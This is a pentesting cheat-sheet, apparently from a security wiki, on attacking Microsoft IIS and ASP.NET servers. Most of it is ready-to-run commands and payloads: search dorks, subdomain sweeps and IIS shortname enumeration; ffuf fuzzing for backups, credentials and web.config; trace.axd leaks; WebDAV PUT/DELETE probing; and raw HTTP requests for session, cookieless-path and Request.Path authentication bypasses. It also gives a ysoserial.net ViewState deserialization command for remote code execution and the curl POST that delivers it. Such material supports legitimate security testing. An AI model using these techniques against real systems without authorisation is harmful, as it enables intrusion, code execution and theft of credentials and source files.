---
tags:
  - Web
  - Windows
---

# :material-microsoft: Microsoft IIS

<span class="pill pill-medium">windows web</span> <span class="pill pill-info">web</span>

IIS hosts ASP.NET / classic ASP on Windows. Signature issues: **8.3 short-name
(`~`) disclosure**, verb tampering, and .NET-specific bugs (ViewState, path
handling).

!!! abstract "TL;DR"
    Confirm IIS + .NET version → tilde-enum hidden files/dirs → hit config leaks
    (`web.config`) → attack ViewState if you find a machine key.

## :material-magnify: Identify

```bash
curl -sI http://$TARGET/ | grep -iE 'Microsoft-IIS|X-AspNet|X-Powered'
#   Server: Microsoft-IIS/10.0   X-AspNet-Version: 4.0.30319
nuclei -u http://$TARGET -tags iis,aspnet
```

### Dorking for exposed instances

*From "Hacking Microsoft IIS" by [Lostsec](https://medium.com/@lostsec).*

Before touching a host, harvest them in bulk. The default "IIS Windows Server"
welcome page and the `Server:` banner are both indexed by the usual engines.

Google — text, URL and title variants of the welcome page across a target's subdomains:

```text
intext:IIS Windows Server site:*.target.com
inurl:"IIS Windows Server" site:*.target.com
intitle:"IIS Windows Server" site:*.target.com
```

Shodan — title plus org/cert scoping, and version-pinned product filters:

```text
http.title:"IIS"
org:"target" http.title:"IIS Windows Server"
Ssl:"Company Inc." http.title:"IIS Windows Server"
hostname:".target.com" "Microsoft-IIS/6.0"
product:"Microsoft IIS httpd" version:"7.5"
Ssl.cert.subject.CN:"target.com" http.title:"IIS Windows Server"
```

FOFA — header- and body-based, narrowed by host or domain:

```text
body="iis-8.5"
server="Microsoft-IIS"
server="Microsoft-IIS/8.5"
server="Microsoft-IIS" && host=".example.com"
server="Microsoft-IIS" && domain="example.com"
```

Hunter.how — title and response-header matching tied to a domain:

```text
web.title="IIS Windows Server" and domain="target.com"
header.server=="Microsoft-IIS/10" and domain="target.com"
```

### Confirming IIS on a discovered host

Three cheap confirmations: the default blue welcome page, Wappalyzer's tech
fingerprint (often with the version), and the response headers.

```bash
curl -I https://target.com

# If you see headers like these, it confirms the server is running IIS:

Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
```

Service detection plus default scripts gives you the version and title in one shot:

```bash
nmap -p 80,443 -sV -sC target.com

# Example output:
80/tcp  open  http     Microsoft IIS httpd 10.0
| http-server-header: Microsoft-IIS/10.0
|_http-title: Welcome to IIS

443/tcp open  ssl/http Microsoft IIS httpd 10.0
```

### Version-specific weaknesses

Pin the version early — it decides which attack paths are even plausible and stops
you burning time on vectors that don't exist in that build.

```text
IIS 6.0 (Windows Server 2003 Era)
- WebDAV frequently enabled by default
- PUT upload misconfigurations common
- Classic ASP legacy applications widely used
- Weak request filtering
- Shortname (8.3) enumeration often exploitable
- Deprecated SSL/TLS protocols and weak ciphers
- Exposed ISAPI extensions

IIS 7.0 / 7.5 (Windows Server 2008 / 2008 R2)
- Shortname (8.3) enumeration commonly present
- WebDAV misconfigurations still frequent
- Request filtering bypass in poorly configured setups
- ViewState misconfiguration in older ASP.NET apps
- TRACE sometimes enabled
- Weak or predictable MachineKey in legacy apps

IIS 8.0 / 8.5 (Windows Server 2012 / 2012 R2)
- Shortname enumeration may still exist if not disabled
- Weak upload validation in custom handlers
- Misconfigured WebDAV in upgraded environments
- Outdated ASP.NET components
- TLS misconfiguration in default deployments
- Verbose error pages leaking information

IIS 10.0 (Windows Server 2016+ and newer)
- More secure by default
- Issues mostly caused by misconfiguration, not core IIS
- Exposed debug endpoints (trace.axd, etc.)
- Insecure file upload logic
- Weak access controls on internal paths
- Azure App Service misconfigurations (if cloud-hosted)
- Outdated .NET applications running on modern IIS

Testing Focus Strategy
- IIS 6.0 / 7.x: prioritize shortname, WebDAV, legacy ASP, weak TLS, ViewState
- IIS 8.x: focus on handler misconfig, upload abuse, leftover legacy configs
- IIS 10.x: focus on application logic flaws, access control issues, debug exposure, backup leaks
```

### Subdomain sweep → IIS filter

Collect the whole subdomain surface first, passive and active, then merge:

```bash
# Passive tools

subfinder -d example.com -all -silent -o subfinder.txt
assetfinder --subs-only example.com > assetfinder.txt
amass enum -passive -d example.com -o amass_passive.txt
findomain -t example.com -u findomain.txt
chaos -d example.com > chaos.txt
waybackurls example.com | unfurl -u domains > wayback.txt

# Active tools

amass enum -active -d example.com -o amass_active.txt
dnsx -d example.com -resp -o dnsx.txt
puredns bruteforce wordlist.txt example.com -o puredns.txt

# Combine all results

cat *.txt | sort -u > all_subdomains.txt
```

Probe the merged list and keep only the IIS hosts — then split by version so the
legacy builds float to the top of your queue:

```bash
cat all_subdomains.txt | httpx-toolkit -mc 200 -sc -td -title -server | grep IIS
```

```bash
cat all_subdomains.txt | httpx-toolkit -mc 200 -sc -td -title -server | grep -i "IIS/7.5"
cat all_subdomains.txt | httpx-toolkit -mc 200 -sc -td -title -server | grep -i "IIS/8.5"
cat all_subdomains.txt | httpx-toolkit -mc 200 -sc -td -title -server | grep -i "IIS/10.0"
```

Then run templates over the survivors — shortname detection, the IIS tag set, and a
full CVE pass, since unpatched IIS is common:

```bash
cat all_subdomains.txt | nuclei -t /nuclei-templates/http/misconfiguration/iis-shortname-detect.yaml
cat all_subdomains.txt | nuclei -tags iis
```

```bash
cat all_subdomains.txt | nuclei -tags cve
```

Cross-check findings against the Internet Information Services product page on
[OpenCVE](https://www.opencve.io/).

## :material-file-hidden: 8.3 short-name (tilde) disclosure

IIS can leak the first 6 chars of file/dir names via the legacy 8.3 format —
enough to guess `web.config`, backups, and admin paths.

```bash
# https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 2 20 http://$TARGET/
# a 404 vs 400 difference on http://$TARGET/AAAAAA~1.* reveals valid prefixes
```

*From "Hacking Microsoft IIS" by [Lostsec](https://medium.com/@lostsec).*

nmap has a script for the quick yes/no:

```bash
nmap -p 80,443 --script http-iis-short-name-brute target.com

# Example output:
| http-iis-short-name-brute:
|   VULNERABLE:
|   IIS Short Name (8.3) Enumeration
|   State: VULNERABLE
|   Discovered: /ASPNET~1/
|_  Discovered: /UPLOAD~1/
```

For real enumeration use [shortscan](https://github.com/bitquark/shortscan), which
diffs subtle response differences and uses checksum comparison to recover names.
Run it against the web root and against any directory you already know about:

```bash
shortscan http://target.com/
shortscan http://target.com/ -F
shortscan @targets.txt -F

shortscan http://target.com/admin
shortscan http://target.com/admin/
```

It will tell you whether 8.3 enumeration is enabled, list valid shortnames such as
`ADMINI~1`, `WEBCON~1` or `BACKUP~1`, work per-directory as well as at the root, and
attempt to expand a shortname back to the real name (`ADMINI~1` → `administrator`).
The Burp Suite IIS Short Name Scanner extension does the same job from inside Burp.

## :material-crosshairs-gps: Precision fuzzing from shortnames

*From "Hacking Microsoft IIS" by [Lostsec](https://medium.com/@lostsec).*

A shortname is a 6-character prefix plus an extension — that turns blind directory
brute force into a targeted search. Start with an IIS-flavoured wordlist
([coffinxp/payloads `iis.txt`](https://github.com/coffinxp/payloads/blob/main/iis.txt))
and a curated extension set, because plenty of files never surface through shortname
enumeration alone:

```bash
ffuf -u "https://target.com/FUZZ" -c -ac -fs 0 -w iis.txt
ffuf -u "https://target.com/FUZZ" -c -ac -fs 0 -w iis.txt -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
```

Don't stop at the IIS list — the same extension set over generic wordlists finds a
different half of the surface:

```bash
ffuf -u "https://target.com/FUZZ" -c -ac -fs 0 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -u "https://target.com/FUZZ" -c -ac -fs 0 -w /usr/share/seclists/Discovery/Web-Content/big.txt -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
```

When you know the extension but not the name, pin the extension and fuzz the stem:

```bash
ffuf -u "https://target.com/FUZZ.rar" -c -ac -fs 0 -w iis.txt
ffuf -u "https://target.com/FUZZ.rar" -c -ac -fs 0 -w /usr/share/seclists/Discovery/Web-Content/big.txt

#Example Output:
URL: https://example.com/
Running: Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
Vulnerable: Yes!
════════════════════════════════════════════════════════════════════════════════
HRMSTE~1             HRMSTE?
WEB~1.CON            WEB.CON?
HRMS_S~1.RAR         HRMS_S?.RAR?
HRMSTE~1.RAR         HRMSTE?.RAR?
ASPNET~1             ASPNET?             ASPNET_CLIENT
APPLIC~1             APPLIC?             APPLICATION
APPLIC~1.RAR         APPLIC?.RAR?
```

A richer scan often returns a whole spread of file types at once — archives, backups,
credential dumps, handlers and DLLs:

```text
URL        : https://example.com/
Server     : Microsoft-IIS/10.0 (ASP.NET v4.0.30319)
Vulnerable : Yes!

══════════════════════════════════════════════════════════════════════════════

ADMINS~1              ADMINS?
BACKUP~1.ZIP          BACKUP?.ZIP?
CONFIG~1.BAK          CONFIG?.BAK?
SECRET~1.RAR          SECRET?.RAR?
ARCHIV~1.7Z           ARCHIV?.7Z?
SOURCE~1.ZIP          SOURCE?.ZIP?
CREDEN~1.TXT          CREDEN?.TXT?
TOKEN~1.BAK           TOKEN?.BAK?
SERVIC~1.SVC          SERVIC?.SVC?
UPLOAD~1.ASPX         UPLOAD?.ASPX?
ADMINP~1.ASPX         ADMINP?.ASPX?
DATA~1.DLL            DATA?.DLL?
AUTH~1.DLL            AUTH?.DLL?
PAYMEN~1.EXE          PAYMEN?.EXE?
REPORT~1.RAR          REPORT?.RAR?
ASPNET~1               ASPNET?              ASPNET_CLIENT

══════════════════════════════════════════════════════════════════════════════
```

Resolve them all in one pass:

```bash
ffuf -u "https://target.com/FUZZ" -c -ac -fs 0 -w iis.txt -e .exe,.dll,.rar,.zip,.7z,.bak,.svc,.aspx
```

Once you know a name starts with `MEDIVEST`, fuzz only the tail:

```bash
ffuf -u "https://target.com/MEDIVESTFUZZ" -c -ac -fs 0 -w payloads/payloads/iis.txt -e .exe,.dll,.rar -fc 403
```

**Every hit is a new directory to fuzz.** One discovered file usually means backups
and siblings in the same folder — turn the hit into a new base path and go again:

```bash
ffuf -u "https://target.com/FTP-Contacts/FUZZ" -c -ac -fs 0 -w payloads/payloads/iis.txt -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar -fc 403
```

### Variation-based fuzzing

Real filenames follow developer habits — environment prefixes, hyphenated suffixes,
version tags. Move `FUZZ` around instead of only using it as the whole path:

```bash
# Base Pattern
ffuf -w iis.txt -u https://example.com/FUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar

# Prefix Variations
ffuf -w iis.txt -u https://example.com/domainFUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/prodFUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/devFUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/stageFUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/apiFUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/adminFUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar

# Suffix Variations
ffuf -w iis.txt -u https://example.com/FUZZdomain -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/FUZZprod -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/FUZZdev -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/FUZZapi -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar

# Hyphen Variations
ffuf -w iis.txt -u https://example.com/FUZZ-domain -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/domain-FUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/FUZZ-prod -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/prod-FUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar

# Underscore Variations
ffuf -w iis.txt -u https://example.com/FUZZ_domain -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/domain_FUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar

# Version Variations
ffuf -w iis.txt -u https://example.com/FUZZv1 -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/v1FUZZ -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
ffuf -w iis.txt -u https://example.com/FUZZ-2024 -e .json,.js,.svc,.html,.htm,.txt,.zip,.asmx,.aspx,.7z,.ashx,.asp,.xml,.exe,.dll,.gz,.xsl,.bak,.old,.rar
```

### High-value extensions

Why each extension is in that list:

```text
.json  (Configuration files, API responses, stored data)
.js    (JavaScript source files that may expose endpoints or keys)
.svc   (WCF service endpoints)
.html  (Static web pages)
.htm   (Older static web page format)
.txt   (Notes, logs, or accidentally exposed data)
.zip   (Compressed backups or archived site content)
.asmx  (XML-based web services)
.aspx  (ASP.NET web pages)
.7z    (Archived backups or packaged files)
.ashx  (HTTP handlers often used for APIs or file processing)
.asp   (Legacy Active Server Pages)
.xml   (Configs, data files, or service responses)
.exe   (Executable files, installers, or internal tools)
.dll   (Application libraries that may be directly accessible)
.gz    (Compressed backup or log files)
.xsl   (Stylesheets used for XML transformations)
.bak   (Backup copies of important files)
.old   (Older versions of files left on the server)
.rar   (Compressed archives containing site data or backups)
```

### GitHub path correlation

Deployment folder names repeat across an org's repositories. A discovered shortname
path like these:

```text
/LINKON~1
/LINKON~2
```

becomes a GitHub code search:

```text
path:/LINKON
```

which surfaces repos using the same folder structure — and with them the real file
names that normally live there (installers, configs, packaged archives). Directory
discovery turns into informed guessing for the next fuzzing round.

!!! loot "Exposed .dll? Decompile it"
    Load any `.dll` you pull down into [dotPeek](https://www.jetbrains.com/decompiler/)
    and read the compiled logic for: hardcoded paths and internal URLs, hidden or
    undocumented API endpoints, API keys/tokens, database connection strings, feature
    flags and debug/test routes, leftover credentials, and backup file references.
    Even without source, the assembly maps the app's structure and points at the
    routes worth testing next.

## :material-file-cog: Config & source leaks

```bash
# web.config often holds connection strings + the machineKey
curl http://$TARGET/web.config
curl http://$TARGET/web.config.bak http://$TARGET/web.config.old
# trace.axd / elmah.axd leak requests + secrets when left enabled
curl http://$TARGET/trace.axd http://$TARGET/elmah.axd
```

Try the capitalised form too — some rules and handlers treat it differently:

```text
https://target.com/Trace.axd
```

Left enabled in production it dumps request logs, internal paths, parameters and
cookies — free recon that sharpens every later fuzz.

!!! loot "A leaked machineKey = ViewState RCE"
    With the `validationKey`/`decryptionKey` from `web.config`, forge a malicious
    `__VIEWSTATE` with `ysoserial.net` for deserialization RCE.
    ```bash
    ysoserial.exe -p ViewState -g TextFormattingRunProperties \
      --generator=<gen> --validationkey=<key> --validationalg=SHA1 -c "cmd"
    ```
    See [Deserialization](../web/deserialization.md).

## :material-alert: Other checks

```bash
# Verb tampering / PUT+MOVE upload (WebDAV)
curl -X OPTIONS http://$TARGET/ -i          # look for PUT, MOVE
davtest -url http://$TARGET/
# ASP.NET path bugs / padding oracle on older versions (MS10-070)
```

*From "Hacking Microsoft IIS" by [Lostsec](https://medium.com/@lostsec).*

If `OPTIONS` answers with `DAV: 1,2` and a permissive `Allow:` list, prove the
methods actually work rather than trusting the banner:

```bash
curl -X OPTIONS https://target.com -i
```

A response carrying these means WebDAV or unsafe methods are live:

```text
DAV: 1,2
Allow: GET, POST, PUT, DELETE, PROPFIND
```

Prove the methods actually work rather than trusting the banner:

```bash
curl -X PUT https://target.com/test.txt --data "test"
curl -X DELETE https://target.com/test.txt
curl -X MOVE https://target.com/test.txt
curl -X PROPFIND https://target.com/
```

### ASP.NET session & path quirks

If the app only checks that `ASP.NET_SessionId` is *present* instead of validating
ownership and permissions, a replayed or manipulated cookie walks past the ACL:

```http
# Normal request (blocked)

GET /admin/dashboard.aspx HTTP/1.1
Host: target.com

HTTP/1.1 403 Forbidden

# Request with manipulated session (bypass scenario)

GET /admin/dashboard.aspx HTTP/1.1
Host: target.com
Cookie: ASP.NET_SessionId=VALID_OR_MANIPULATED_SESSION

HTTP/1.1 200 OK
```

ASP.NET also supports **cookieless sessions**, where the session ID rides in the path
as `(S(…))`. IIS strips that segment internally before routing — so a WAF that
doesn't normalise the same way never matches its own rule:

```http
# Normal Request (Blocked by WAF)

GET /AdminPanel.aspx HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

HTTP/1.1 403 Forbidden
Server: AkamaiGHost
Content-Type: text/html
Content-Length: 512

# Cookieless Session Injection (Bypass)

GET /(S(ABC123XYZ))/AdminPanel.aspx HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
Set-Cookie: ASP.NET_SessionId=ABC123XYZ; path=/; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 10452
```

Apps that gate access on `Request.Path` comparisons fall to the same class of trick —
appending an allowed page to a protected one changes the compared string but not the
handler that ultimately runs:

```http
# Before Bypass (Redirected to Login)

GET /Admin/ManageUsers.aspx HTTP/1.1
Host: target.com

HTTP/1.1 302 Found
Location: /Login.aspx
Set-Cookie: ASP.NET_SessionId=abc123xyz; path=/; HttpOnly
Server: Microsoft-IIS/10.0

# After Bypass (Path Manipulation)

GET /Admin/ManageUsers.aspx/Login.aspx HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=newsessionvalue; path=/; HttpOnly
Content-Type: text/html; charset=utf-8
```

For paths that stay forbidden, run a bypass suite such as
[4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3) — but verify status code,
body and content length, because most "bypasses" are just a redirect to the parent
directory. See [403 Bypass](../web/403-bypass.md).

Finally, every ASP.NET form is worth a ViewState pass — look for the hidden field in
the page source:

```html
<input type="hidden" name="__VIEWSTATE" value="BASE64_ENCODED_DATA" />
```

```bash
echo "BASE64_ENCODED_DATA" | base64 -d
```

Even when MAC validation holds, the decoded blob leaks internal control names and app
structure. Where it doesn't hold (weak or leaked MachineKey), generate and swap in a
payload:

```bash
ysoserial.net -p ViewState -g TextFormattingRunProperties -c "whoami"
```

```bash
curl -X POST https://target.com/login.aspx \
-d "__VIEWSTATE=GENERATED_PAYLOAD&username=test&password=test"
```

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- ViewState → [Deserialization](../web/deserialization.md); on a shell → [Windows Privesc](../privesc/windows.md).
- Reference: [HackTricks IIS](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html).
